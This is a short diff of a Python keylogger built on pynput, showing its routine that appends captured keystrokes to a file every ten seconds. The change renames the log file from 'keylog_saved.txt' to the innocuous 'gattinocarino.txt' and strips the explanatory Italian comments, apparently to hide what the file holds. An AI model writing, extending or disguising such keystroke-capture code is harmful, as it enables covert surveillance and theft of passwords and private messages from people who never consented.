@@ -1,21 +1,21 @@
 from pynput import keyboard
 import threading
 
-# Nome del file in cui salvare i dati dei tasti premuti
-log_file = "keylog_saved.txt"
 
-# Variabile globale per salvare temporaneamente i tasti premuti
+gattino_file = "gattinocarino.txt"
+
+
 text = ""
 
-# Intervallo di tempo in secondi per salvare i dati nel file
+
 time_interval = 10
 
-# Funzione per salvare i dati nel file
+
 def save_to_file():
     global text
     try:
-        # Apriamo il file in modalità append per aggiungere i dati
-        with open(log_file, "a") as f:
+      
+        with open(gattino_file, "a") as f:
             f.write(text)
         # Dopo aver salvato, svuotiamo il contenuto della variabile text
         text = ""
